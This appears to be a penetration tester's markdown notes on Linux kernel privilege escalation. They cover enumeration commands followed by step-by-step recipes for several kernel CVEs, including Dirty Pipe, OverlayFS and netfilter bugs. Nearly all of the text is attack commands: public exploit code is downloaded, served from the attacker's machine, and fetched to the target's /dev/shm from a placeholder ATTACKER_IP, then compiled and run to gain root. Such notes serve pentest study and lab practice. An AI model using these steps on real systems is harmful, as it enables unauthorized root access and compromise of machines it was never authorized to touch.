---
Primary_category: "[[LINUX PRIVESC]]"
title: "KERNEL ABUSE"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[LINUX PRIVESC]]

#### *Enumeration*

##### *OS Version*

```bash
lsb_release -a
cat /etc/os-release
cat /etc/issue
hostnamectl
```

##### *Kernel Version*

Simply run the following command on the target in order to extract the *Kernel* version

```bash
uname -a
```

Once we know the given version, a quick *Google* search should tell us whether the *Kernel* is vulnerable or not

---

#### *CVE-2017-16995*

> ***[CVE-2017-16995](https://vulners.com/zdt/1337DAY-ID-30003)***

> ***[ExploitDB](https://www.exploit-db.com/exploits/44298)***

##### *Setup*

###### *Downloading the Exploit*

> ***From the Attacker*** ⚔️ 

```bash
curl --silent --location --request GET 'https://www.exploit-db.com/raw/44298' --output exploit.c
```

###### *Transferring the Binary to the Target*

> ***From the Attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the Target*** 🎯

```bash
cd /dev/shm && curl --silent --location --request GET 'http://<ATTACKER_IP>/exploit' --remote-name
```

###### *Compiling the Binary*

> ***From the Target***🎯 

```bash
gcc -o exploit exploit.c
```

```bash
chmod 700 exploit
```

##### *Usage*

```bash
./exploit
```

---

#### *OverlayFS*

> ***[CVE-2021-3493](https://nvd.nist.gov/vuln/detail/CVE-2021-3493)***

> ***[Github PoC](https://github.com/briskets/CVE-2021-3493)***

##### *Setup*

###### *Downloading the Exploit*

> ***From the Attacker*** ⚔️ 

```bash
curl --silent --location --request GET 'https://github.com/briskets/CVE-2021-3493/raw/refs/heads/main/exploit.c' --output exploit.c
```

###### *Transferring the Binary to the Target*

> ***From the Attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the Target*** 🎯

```bash
cd /dev/shm && curl --silent --location --request GET 'http://<ATTACKER_IP>/exploit' --remote-name
```

###### *Compiling the Binary*

> ***From the Target***🎯 

```bash
gcc -o exploit exploit.c
```

```bash
chmod 700 exploit
```

##### *Usage*

```bash
./exploit
```

---

#### *Dirty Pipe*

> ***[CVE-2022-0847](https://nvd.nist.gov/vuln/detail/cve-2022-0847)***

> ***Affected Versions → All Kernels from 5.8 to 5.17***

> ***[Github PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)***

##### *Setup*

###### *Downloading the Exploit*

> ***From the Attacker*** ⚔️

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits DirtyPipe
```

- ***Transferring the file***

If we have *SSH* access to the target, we can simply use *RSYNC* to transfer all the repository resources to the target

> ***From the Target*** 🎯

```bash
mkdir /dev/shm/DirtyPipe
```

> ***From the Attacker*** ⚔️

```bash
cd DirtyPipe && rsync --progress -AXavz --exclude=/.git . <USER>@<TARGET>:/dev/shm/DirtyPipe/
```

If not, just use an *HTTP* client such as *curl* or *wget* to download the files after setting up an *HTTP* server

- ***Compiling the binary***

> ***From the Target*** 🎯

```bash
cd /dev/shm/DirtyPipe && bash ./compile.bash
```

If the target does not have the **`gcc`** utility available, we should compile static binaries from the attacker machine by performing an *static linking* to ensure maximum portability

To do so, simply run the following command to generate the static binaries after cloning the *Github* repository

> ***From the attacker*** ⚔️

```bash
gcc -static -o exploit-1 ./exploit-1.c
gcc -static -o exploit-2 ./exploit-2.c
```

Then, all that remains is to transfer the binaries to the target and run them

###### *Usage*

- ***Exploit-1***

This first exploit modifies the **`/etc/passwd`** and gives us a ***[[SHELL SCRIPTING|shell]]*** with *ROOT* privileges

```bash
chmod 700 ./exploit-1 && ./exploit-1
```

- ***Exploit-2***

The second allows us to run *SUID* binaries with *ROOT* privileges in order to spawn a new *shell* instance

First, we have to look for *SUID* system binaries

```bash
find / -perm -4000 -type f -ls 2> /dev/null
```

Then, we can choose a binary and specify its full path as an argument for the exploit and execute it

```bash
chmod 700 ./exploit-2 && ./exploit-2 /usr/bin/sudo
```

---

#### *Netfilter Kernel Module*

##### *CVE-2021-22555*

> ***[CVE-2021-22555](https://nvd.nist.gov/vuln/detail/cve-2021-22555)***

> ***Affected Versions → Linux Kernel from 2.6 to 5.11***

###### *Setup*

- ***Downloading the exploit***

> ***From the Attacker*** ⚔️

```bash
curl --silent --location --request GET 'https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c' --remote-name
```

- ***Compiling the binary***

> ***From the Attacker*** ⚔️

```bash
gcc -m32 -static -o ./exploit ./exploit.c
```

- ***Transferring the binary to the target***

> ***From the Attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the Target*** 🎯 

```bash
cd /dev/shm && curl --silent --location --request GET 'http://<ATTACKER_IP>/exploit' --remote-name
```

```bash
chmod 700 ./exploit
```

###### *Usage*

```bash
./exploit
```

##### *CVE-2022-25636*

> ***[CVE-2022-25636](https://nvd.nist.gov/vuln/detail/cve-2022-25636)***

> ***Affected Versions → Linux Kernel from 5.4 to 5.6.10***

> ***Heap out-of-bounds write***

> ***[Github PoC](https://github.com/Bonfee/CVE-2022-25636)***

###### *Setup*

- ***Cloning the Github Repository***

> ***From the Attacker*** ⚔️

```bash
git clone https://github.com/Bonfee/CVE-2022-25636 CVE-2022-25636
```

- ***Transferring the resources to the target***

We can transfer all the repository resources to the target in order to compile the binary from it. To do so, the **`gcc`** utility must be available in the target

If so, we can use *RSYNC* to transfer them if we have *SSH* access to the target

> ***From the Target*** 🎯

```bash
mkdir /dev/shm/CVE-2022-25636
```

> ***From the Attacker*** ⚔️

```bash
cd CVE-2022-25636 && rsync --progress -AXavz --exclude=/.git . <USER>@<TARGET>
```

If **`gcc`** is not available on the target, we can modify the **`Makefile`** resource and add the **`-static`** option to the **`gcc`** command

Doing so, we change the *linker* behavior from a *dynamic* to an *static* linking, where all libraries and dependencies are embedded within the *binary*, thereby creating an *static*  binary

Once we edit the **`Makefile`** resource, we are ready to compile the binary

- ***Compiling the binary***

> ***From the Attacker | Target*** ⚔️🎯

```bash
make
```

Then, transfer the *static* binary to the target, set execution permissions and run it

###### *Usage*

```bash
chmod 700 ./exploit && ./exploit
```

##### *CVE-2023-32233*

> ***[CVE-2023-32233](https://nvd.nist.gov/vuln/detail/cve-2023-32233)***

> ***Affected Versions → 6.3.1 and lower***

> ***[Github PoC](https://github.com/Liuk3r/CVE-2023-32233)***

###### *Setup*

- ***Downloading the exploit***

> ***From the Attacker*** ⚔️

```bash
curl --silent --location --request GET 'https://github.com/Liuk3r/CVE-2023-32233/raw/refs/heads/main/exploit.c' --remote-name
```

- ***Transferring the exploit to the target***

As mentioned several times, if the **`gcc`** utility is available on the target, just transfer the resource and compile it from the target, such as follows

> ***From the Attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the Target*** 🎯

```bash
curl --silent --location --request GET 'http://<ATTACKER_IP>/exploit.c' --remote-name
```

- ***Compiling the binary***

However, it **`gcc`** is not available, we must create an *static binary* from the attacker machine by issuing the following command

```bash
gcc -static -o ./exploit ./exploit.c
```

Then, we can transfer this static binary to the target and run it after settting up execution permissions on it

Continuing with the first case, if **`gcc`** is available, proceed as follows

> ***From the Target*** 🎯

```bash
gcc -o ./exploit ./exploit.c
```

###### *Usage*

```bash
chmod 700 ./exploit && ./exploit
```